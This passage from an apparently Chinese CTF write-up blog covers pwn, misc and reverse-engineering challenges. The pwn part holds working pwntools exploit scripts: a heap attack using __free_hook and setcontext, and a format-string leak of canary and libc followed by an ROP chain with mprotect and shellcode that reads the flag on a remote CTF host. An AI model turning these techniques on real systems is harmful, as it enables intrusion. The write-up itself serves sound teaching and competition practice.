class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span>)</span><br><span class="line">leak_addr = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x58</span> - <span class="number">0x10</span> - <span class="number">0x3f8</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>, flat([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x31</span>, libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">0x200</span>]))</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(0, 0x23330000, 0x200) </span></span><br><span class="line"><span class="comment"># rdi = 0, rsi = 0x23330000, rdx = 0x200</span></span><br><span class="line">payload = flat([p64(<span class="number">0</span>) * <span class="number">0xd</span>, p64(<span class="number">0</span>), p64(<span class="number">0x23330000</span>), p64(<span class="number">0</span>) * <span class="number">2</span>, <span class="comment"># 0x68 rdi 0x70 rsi</span></span><br><span class="line">p64(<span class="number">0x200</span>) + p64(<span class="number">0</span>) * <span class="number">2</span>, <span class="comment"># 0x88 rdx</span></span><br><span class="line">p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">0x100</span>), p64(libc.sym[<span class="string">&#x27;read&#x27;</span>]), <span class="comment"># 0xa0 rsp, 0xa8 rcx</span></span><br><span class="line">p64(<span class="number">0</span>) * <span class="number">0xa</span>, p64(<span class="number">0x23330000</span>),<span class="comment"># 0x100 rsp2</span></span><br><span class="line">p64(<span class="number">0</span>) * <span class="number">0x1f</span>, p64(libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span>)]) <span class="comment"># 0x200 __free_hook</span></span><br><span class="line">add(<span class="number">0x20</span>, payload)</span><br><span class="line">pause()</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(asm(shellcraft.cat(<span class="string">&quot;/flag&quot;</span>)))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><ul><li>最终获得flag：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5ec939f8-6ffb-43b9-b4ce-cfc5258f2c33&#125;</span><br></pre></td></tr></table></figure><h3 id="hehepwn"><a href="#hehepwn" class="headerlink" title="hehepwn"></a>hehepwn</h3><ul><li>一道简单的栈溢出题，是安恒平台上的原题。这里就不做了。补充一个读flag的shellcode姿势：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asm(shellcraft.cat(&#x27;/flag&#x27;))</span><br></pre></td></tr></table></figure><h3 id="hahapwn"><a href="#hahapwn" class="headerlink" title="hahapwn"></a>hahapwn</h3><ul><li>常规检查：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-&gt; % checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/secc/Desktop/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><ul><li>关注禁用函数，首先不能提权，其次使用自定义禁用的结构体v4：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v22; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v22 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v4);</span><br><span class="line">  welcome();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>不允许使用execve系统调用：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-&gt; % seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x00 0x01 0x0000003b  <span class="keyword">if</span> (A != execve) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br></pre></td></tr></table></figure><ul><li>打开IDA反编译程序，主函数很简单：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">welcome</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-B0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">104</span>]; <span class="comment">// [rsp+40h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome! What is your name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);<span class="comment">// 存在格式化字符串漏洞</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nWhat can we help you?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v2, <span class="number">0x200</span>uLL);<span class="comment">// 存在栈溢出漏洞</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>具体思路是，使用格式化字符串泄露<code>canary</code>、<code>stack</code>、<code>libc</code>地址。</p><ul><li>首先用gdb调试，找到<code>canary</code>、<code>stack</code>、<code>libc</code>分别为25、27和28位（25 = 0x14 + 0x5），使用格式化字符串<code>%25$p$27$p%28$p</code>泄露地址。</li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202109272243844.png" alt="image-20210927224303754"></p></li><li><p>主要思路：</p><ul><li>泄露地址。</li><li>栈溢出将shellcode写入到bss段。</li><li>使用mprotect系统调用修改bss段为rwx权限，返回到bss段getshell。</li></ul></li><li><p>形成脚本：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, endian = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26504</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">pause()</span><br><span class="line">sh.sendafter(<span class="string">&#x27;Welcome! What is your name?\n&#x27;</span>, <span class="string">&#x27;%25$p%27$p%28$p&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">leak_info = sh.recvline()</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(leak_info[:<span class="number">12</span>], <span class="number">16</span>) - libc.sym[<span class="string">&#x27;setvbuf&#x27;</span>] - <span class="number">324</span></span><br><span class="line">canary = <span class="built_in">int</span>(leak_info[<span class="number">14</span>:<span class="number">30</span>], <span class="number">16</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(leak_info[<span class="number">32</span>:<span class="number">44</span>], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base), <span class="built_in">hex</span>(canary), <span class="built_in">hex</span>(stack))</span><br><span class="line">bss_addr = <span class="number">0x0601060</span></span><br><span class="line"></span><br><span class="line">rsi_ret = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rsi\nret&quot;</span>)))</span><br><span class="line">rdx_ret = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rdx\nret&quot;</span>)))</span><br><span class="line">rdi_ret = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rdi\nret&quot;</span>)))</span><br><span class="line">rax_ret = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rax\nret&quot;</span>)))</span><br><span class="line">syscall = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;syscall\nret&quot;</span>)))</span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line"><span class="string">&#x27;a&#x27;</span> * <span class="number">0x68</span>,</span><br><span class="line">canary,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">rdi_ret, <span class="number">0</span>,</span><br><span class="line">rsi_ret, bss_addr,</span><br><span class="line">rdx_ret, <span class="number">800</span>,</span><br><span class="line">libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>],</span><br><span class="line">rdi_ret, bss_addr &amp; ~<span class="number">0xfff</span>,</span><br><span class="line">rsi_ret, <span class="number">0x1000</span>,</span><br><span class="line">rdx_ret, <span class="number">7</span>,</span><br><span class="line">rax_ret, <span class="number">0xa</span>,</span><br><span class="line">syscall,</span><br><span class="line">bss_addr])</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;What can we help you?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.send(asm(shellcraft.cat(<span class="string">&#x27;./flag&#x27;</span>)))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><ul><li>注意使用<code>SYS_mprotect</code>系统调用时，输入的地址需要是合法且是目录页（page size）的倍数，64位系统的目录页为0x1000，所以这里采用了<code>bss_addr &amp; ~0xfff</code>的形式。</li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110061340266.png" alt="image-20211006134046768"></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="Girlfriend’s-account"><a href="#Girlfriend’s-account" class="headerlink" title="Girlfriend’s account"></a>Girlfriend’s account</h3><ul><li>打开题目发现是一个计算题：</li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202109281105797.png" alt="image-20210928110500032" style="zoom:50%;" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;账单总金额四舍五入保留至小数点后两位&#125;，例如总金额为 543.21 元时，你需要提交 flag&#123;543.21&#125;</span><br></pre></td></tr></table></figure><ul><li>使用excel的公式转换大写数字：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=SUM(ISNUMBER(SEARCH(TEXT(&#123;1,2,3,4,5,6,7,8,9&#125;,&quot;[dbnum2]&quot;&amp;&#123;&quot;0亿&quot;;&quot;0仟!*万&quot;;&quot;0佰!*万&quot;;&quot;0拾!*万&quot;;&quot;0万&quot;;&quot;万!*0仟&quot;;&quot;万!*0佰&quot;;&quot;万!*0拾&quot;;&quot;0元&quot;;&quot;0角&quot;;&quot;0分&quot;&#125;),IF(ISERR(FIND(&quot;万&quot;,A2)),&quot;万&quot;,)&amp;A2))*&#123;1,2,3,4,5,6,7,8,9&#125;*10^&#123;8;7;6;5;4;3;2;1;0;-1;-2&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=SUM(ISNUMBER(SEARCH(TEXT(&#123;1,2,3,4,5,6,7,8,9&#125;,&quot;[dbnum2]&quot;),IF(ISERR(FIND(&quot;万&quot;,B4985)),&quot;万&quot;,)&amp;B2))*&#123;1,2,3,4,5,6,7,8,9&#125;)</span><br></pre></td></tr></table></figure><ul><li>注意如果要使用公式的话，需要把excel改成中文，不然会全部显示0，而且最新版的office365似乎不识别<code>!*</code>语法，我们：</li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318196.png" alt="image-20210928094335006"></p><ul><li>最后计算总和即可：</li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202109281102277.png" alt="image-20210928110242097" style="zoom:50%;" /></p><ul><li>flag：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;12305926.36&#125;</span><br></pre></td></tr></table></figure><h3 id="双目失明，身残志坚"><a href="#双目失明，身残志坚" class="headerlink" title="双目失明，身残志坚"></a>双目失明，身残志坚</h3><ul><li>题目给了两张相同的图片，猜测是盲水印：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 bwmforpy3.py decode original.png blind.png res.png</span><br></pre></td></tr></table></figure><ul><li>发现是黑白圈：</li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202109281211245.png" alt="image-20210928121140662"></p><ul><li>首先尝试转换成二进制，但是无法解密：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0100111111001011001001</span><br><span class="line">0010110011110101011111</span><br><span class="line">1001001100010000100011</span><br></pre></td></tr></table></figure><ul><li>后来发现可能是盲文：</li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202109281213584.png" alt="image-20210927111309839"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">⠌⠢⠛⠭⠛⠲⠑⠙⠔⠓⠾</span><br></pre></td></tr></table></figure><ul><li><p>找到盲文对照表查看，应该是拼音盲文：<a href="https://blog.csdn.net/weixin_30785593/article/details/96365878">https://blog.csdn.net/weixin_30785593/article/details/96365878</a></p></li><li><p>进行解密是：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zh e g iang g ong ie d a h,x ue</span><br></pre></td></tr></table></figure><ul><li>所以最后flag是”浙江工业大学”拼音：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;zhejianggongyedaxue&#125;</span><br></pre></td></tr></table></figure><h3 id="ZipBomb"><a href="#ZipBomb" class="headerlink" title="ZipBomb"></a>ZipBomb</h3><ul><li>打开题目是个压缩包，解压之后是大量的压缩包。应该是压缩包文件中隐写了flag。那么就需要进行爆破求解，flag的base64对应值是<code>Zmxh</code>。</li><li>由于压缩包只有两层，首先解压该压缩包到<code>zipBomb</code>文件夹，使用脚本爆破：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line">dir_path = <span class="string">&#x27;./zipBomb&#x27;</span></span><br><span class="line">fileList = <span class="built_in">sorted</span>(os.listdir(dir_path))[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> fileList:</span><br><span class="line">    position = dir_path + <span class="string">&#x27;/&#x27;</span> + file</span><br><span class="line">    <span class="built_in">print</span> (position)        </span><br><span class="line">    z = zipfile.ZipFile(position, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> z.namelist():</span><br><span class="line">        <span class="built_in">bytes</span> = z.read(filename)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;Zmxh&#x27;</span> <span class="keyword">in</span> <span class="built_in">bytes</span>:</span><br><span class="line">            <span class="built_in">print</span>(filename)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">bytes</span>[<span class="number">0</span>:<span class="number">100</span>])</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./zipBomb/ZT.ZIP</span><br><span class="line">./zipBomb/ZG5.ZIP</span><br><span class="line">./zipBomb/YNDAK.ZIP</span><br><span class="line">./zipBomb/XS.ZIP</span><br><span class="line">./zipBomb/X9D.ZIP</span><br><span class="line">C1</span><br><span class="line">b&#x27;ZmxhZ3tGIW5EX0ZsNGdfMW5fMklQXzEzT01CfQ==\xa6\xff\xe9\x00\xdaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span><br></pre></td></tr></table></figure><ul><li>获得base64编码的flag，解码后：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;F!nD_Fl4g_1n_2IP_13OMB&#125;</span><br></pre></td></tr></table></figure><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="ea5ycpp"><a href="#ea5ycpp" class="headerlink" title="ea5ycpp"></a>ea5ycpp</h3><ul><li>使用IDA反编译函数，发现关键函数，要求数组<code>v5</code>要和<code>v14</code>完全相等：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v5 = sub_3920(v11);</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(v5 + i) != v14[i] )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;You are wrong&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>出题程序逻辑还是比较简单的，我们截取一部分来分析：<ul><li>可以看到首先初始化了变量<code>v12</code>，这里的<code>a2</code>和<code>v18</code>只是因为栈参数传递的原因，所以被IDA认为是函数参数。</li><li>接着判断<code>v12</code>的长度是否为24，也就是告诉我们flag的长度为24。</li><li>初始化<code>v13</code>为brianfuck的密文，并再<code>sub_3876</code>函数中将地址赋值给<code>v11</code>变量的<code>+264</code>位置。</li><li>回收v13变量，调用brainfuck解密函数<code>sub_3936</code>，将结果保存在v11变量的<code>+i</code>位置。</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(v12, a2, v18);</span><br><span class="line"><span class="built_in">std</span>::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, v12);</span><br><span class="line"><span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(v13, v12);</span><br><span class="line">sub_38A8(v3, v13);</span><br><span class="line"><span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(v13);</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::size(v12) == <span class="number">24</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::allocator(&amp;v9);</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(</span><br><span class="line">    v13,</span><br><span class="line">    <span class="string">&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;++[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&quot;</span>,</span><br><span class="line">    &amp;v9);</span><br><span class="line">  sub_3876(v11, (__int64)v13);</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(v13);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(&amp;v9);</span><br><span class="line">  sub_3936(v11);</span><br></pre></td></tr></table></figure><ul><li>选择编辑 -&gt; 导出数据，选择<code>raw bytes</code>，并导出成文件：</li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202109281410773.png" alt="image-20210928141035259" style="zoom:50%;" /></p><ul><li>使用Brainfuck Visualizer解密：</li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202109281248146.png" alt="image-20210928124831973"></p><ul><li>也可以使用远程动态调试，当我们输入<code>000000000000000000000000</code>后，发现数组<code>v12</code>的值逐渐变大，这让我们猜测属于变式凯撒加密（注意这个数组<code>v12</code>因为非指针类型的缘故无法直接跳转，这里我们发现它处于右下角的栈空间中，所以右键点击follow in disassemble或者synchronsize with -&gt; Hex View-1就可以看到数组了：</li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202109281340511.png" alt="image-20210928134029918"></p><ul><li><p>发现数组也是从偏移2开始的，和之前的推测一样。</p></li><li><p>写出解密脚本：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cipher = [<span class="number">0x68</span>, <span class="number">0x6F</span>, <span class="number">0x65</span>, <span class="number">0x6C</span>, <span class="number">0x81</span>, <span class="number">0x69</span>, <span class="number">0x7A</span>, <span class="number">0x3D</span>, <span class="number">0x3B</span>, <span class="number">0x79</span>, <span class="number">0x6B</span>, <span class="number">0x73</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x7B</span>, <span class="number">0x70</span>, <span class="number">0x7B</span>, <span class="number">0x48</span>, <span class="number">0x73</span>, <span class="number">0x7C</span>, <span class="number">0x85</span>, <span class="number">0x47</span>, <span class="number">0x7C</span>, <span class="number">0x96</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(cipher[i] - i - <span class="number">2</span>), end = <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 